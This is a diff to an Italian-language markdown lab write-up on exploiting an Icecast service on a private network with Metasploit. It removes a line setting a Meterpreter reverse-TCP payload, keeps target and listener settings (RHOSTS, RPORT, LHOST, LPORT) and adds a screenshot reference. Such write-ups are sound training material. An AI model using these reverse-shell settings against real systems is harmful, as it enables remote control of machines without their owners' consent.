@@ -44,7 +44,6 @@ Prima di iniziare l'attacco, ho verificato che il servizio Icecast fosse attivo 
    ```bash
    set RHOSTS 192.168.50.6
    set RPORT 8000
-   set payload windows/meterpreter/reverse_tcp
    set LHOST 192.168.50.165
    set LPORT 4444
    ```
@@ -73,6 +72,8 @@ Prima di iniziare l'attacco, ho verificato che il servizio Icecast fosse attivo 
    - **Risultato:** Lo screenshot è stato salvato con successo sulla macchina attaccante.
 
    ![Screenshot Desktop](./MeterpreterWin10.png)
+
+![Win10screen](./CAnQgnFm.jpeg)
 
 ## 🚀 **Conclusioni**
 
